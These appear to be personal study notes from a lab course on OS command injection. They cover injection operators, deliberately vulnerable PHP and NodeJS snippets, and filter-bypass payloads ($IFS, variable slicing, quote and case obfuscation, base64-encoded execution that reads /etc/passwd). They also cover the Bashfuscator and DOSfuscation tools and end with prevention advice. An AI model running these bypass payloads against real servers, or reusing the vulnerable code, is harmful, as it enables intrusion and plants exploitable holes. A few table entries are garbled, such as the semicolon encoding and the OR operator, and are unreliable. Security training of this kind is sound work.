A Command Injection vulnerability is among the most critical types of vulnerabilities. It allows us to execute system commands directly on the back-end hosting server, which could lead to compromising the entire network

### types of innjections

|Injection|Description|
|---|---|
|OS Command Injection|Occurs when user input is directly used as part of an OS command.|
|Code Injection|Occurs when user input is directly within a function that evaluates code.|
|SQL Injections|Occurs when user input is directly used as part of an SQL query.|
|Cross-Site Scripting/HTML Injection|Occurs when exact user input is displayed on a web page.|

There are many other types of injections other than the above, like `LDAP injection`, `NoSQL Injection`, `HTTP Header Injection`, `XPath Injection`, `IMAP Injection`, `ORM Injection`

## OS Command Injections

For example, a web application written in `PHP` may use the `exec`, `system`, `shell_exec`, `passthru`, or `popen` functions to execute commands directly on the back-end server, each having a slightly different use case.

 The following code is an example of PHP code that is vulnerable to command injections:

Code: php

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

#### NodeJS Example

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```


# Detection

The process of detecting basic OS Command Injection vulnerabilities is the same process for exploiting such vulnerabilities.


## Command Injection Methods

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b26`                   | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |
>[!tip]
>Tip: In addition to the above, there are a few unix-only operators, that would work on Linux and macOS, but would not work on Windows, such as wrapping our injected command with double backticks (` `` `) or with a sub-shell operator (`$()`).

# Other Injection Operators

## AND Operator

We can start with the `AND` (`&&`) operator, such that our final payload would be (`127.0.0.1 && whoami`

```shell
ping -c 1 127.0.0.1 && whoami
```

## OR Operator

Finally, let us try the `OR` (`||`) injection operator. The `OR` operator only executes the second command if the first command fails to execute.

 It would only attempt to execute the other command if the first command failed and returned an exit code `1`.


|**njection Type**|**Operators**|
|---|---|
|SQL Injection|`'` `,` `;` `--` `/* */`|
|Command Injection|`;` `&&`|
|LDAP Injection|`*` `(` `)` `&` `\|`|
|XPath Injection|`'` `or` `and` `not` `substring` `concat` `count`|
|OS Command Injection|`;` `&` `\|`|
|Code Injection|`'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`|
|Directory Traversal/File Path Traversal|`../` `..\\` `%00`|
|Object Injection|`;` `&` `\|`|
|XQuery Injection|`'` `;` `--` `/* */`|
|Shellcode Injection|`\x` `\u` `%u` `%n`|
|Header Injection|`\n` `\r\n` `\t` `%0d` `%0a` `%09`|
# Identifying Filters

A web application may have a list of blacklisted characters, and if the command contains them, it would deny the request. The `PHP` code may look something like the following:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

## Identifying Blacklisted Character

identfiy by trying it in burp url encoded

# Bypassing Space Filters

## Bypass Blacklisted Spaces

A space is a commonly blacklisted character, especially if the input should not contain any spaces, like an IP, for example.

#### TABS

WE can bypass it by using **TABS (%09)** 
127.0.0.1%0a<span style="background:#d4b106">%09</span>
#### $IFS

127.0.0.1%0a<span style="background:#d4b106">${IFS} </span>

#### Using Brace Expansion
127.0.0.1%0a<span style="background:#d4b106">{ls,-la}</span>

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space

![[Pasted image 20250224141738.png]]

# Bypassing Other Blacklisted Characters


### Linux
characters like slashes can be bypassed by using a path variable

```shell
echo ${PATH}
/usr/local/bin:/usr/bin:/bin:/usr/games
```
So, if we start at the `0` character, and only take a string of length `1`, we will end up with only the `/` character, which we can use in our payload:

```shell
echo ${PATH:0:1}

/
```

WE can do the same to $home $pwd enviorment variables or can do the smae to get the ";" character to be used example:
```shell
echo ${LS_COLORS:10:1}

;
```

### Windows

The concept from above works on windows as well

 we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\htb-student`
specify a starting position by usiong ~6 and specifying a negative end with -number

```cmd
echo %HOMEPATH:~6,-11%
```

or in pwoershell

```powershell
$env:HOMEPATH[0]
```

## Character Shifting

For example, the following Linux command shifts the character we pass by `1`.
So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:
```shell
man ascii     # \ is on 92, before it is [ on 91
```
```shell
echo $(tr '!-}' '"-~'<<<[)

\
```

or for semi-colon

```shell
echo $(tr '!-}' '"-~'<<<:)
;
```


question

![[Pasted image 20250224145218.png]]

# Bypassing Blacklisted Commands

A basic command blacklist filter in `PHP` would look like the following:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

## Linux & Windows


we can bypass this using common characters within our commmand that are usually ignored by command shells like bash and powershell.

Some characters like this are single quote and double quotes

```shell
w'h'o'am'i
```

```shell
w"h"o"am"i
```

127.0.0.1%0aw'h'o'am'i

## Linux Only

 backslash `\` and the positional parameter character `$@`. This works exactly as it did with the quotes, but in this case, `the number of characters do not have to be even`, and we can insert just one of them if we want to:
```bash
who$@ami
w\ho\am\i
```

## Windows Only

```cmd
who^ami
```

##### quzestion

first check if the flag is in the directory

![[Pasted image 20250224150306.png]]

![[Pasted image 20250224150621.png]]


# Advanced Command Obfuscation

## Case Manipulation

we can alternate between capital and normal letters

whoami we can rewrite as WhOaMi

on linux we have to use a command to turn all keys into lwoercase as linux is case sensitive.
```shell-session
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

```bash
$(a="WhOaMi";printf %s "${a,,}")
```


## Reversed Commands

```shell-session
 echo 'whoami' | rev
```

Then, we can execute the original command by reversing it back in a sub-shell (`$()`), as follows:

```shell
$(rev<<<'imaohw')
```

## Encoded Commands

We can utilize various encoding tools, like `base64` (for b64 encoding) or `xxd` (for hex encoding

```shell-session
echo -n 'cat /etc/passwd | grep 33' | base64
```

Now we can create a command that will decode the encoded string in a sub-shell (`$()`), and then pass it to `bash` to be executed (i.e. `bash<<<`), as follows:

```shell-session
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.

### on windows

```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (`iex "$()"`), as follows:

```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

### QUESTION

```shell
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1'| base64

ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
```

burp repeater

```param
ip=127.0.0.1%0abash<<<$(base64${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

# Evasion Tools

## Linux (Bashfuscator)

https://github.com/Bashfuscator/Bashfuscator

```shell
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```
Once we have the tool set up, we can start using it from the `./bashfuscator/bin/` directory.

```shell
 ./bashfuscator -c 'cat /etc/passwd'
[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```

 this uses a random obfuscation technique but we can use flags to specify the result we want
```shell
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters```


## Windows (DOSfuscation)

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
Invoke-DOSfuscation> help
```

# Command Injection Prevention

## System Commands

we should avoid using functions that execute system commands, especially if we are using user input in them.

Try to use built in fuctions that perform the function. Backend languages usually have secure versions of the functionalities.  

for example if we wanted to test where a host is alive with PHP we can use fscokopen function instead .

If we cannot perform the function without using secure functions we should enver directly pass user inpuit without first sanitizing.

## Input validation

`input validation should be done both on the front-end and on the back-end`.

```php
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    // call function
} else {
    // deny request
}
```

```javascript
if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
    // call function
}
else{
    // deny request
}
```

## Input Sanitization

```php
$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);
```

```javascript
var ip = ip.replace(/[^A-Za-z0-9.]/g, '');
```

We can also use the DOMPurify library for a `NodeJS` back-end, as follows:

```javascript
import DOMPurify from 'dompurify';
var ip = DOMPurify.sanitize(ip);
```

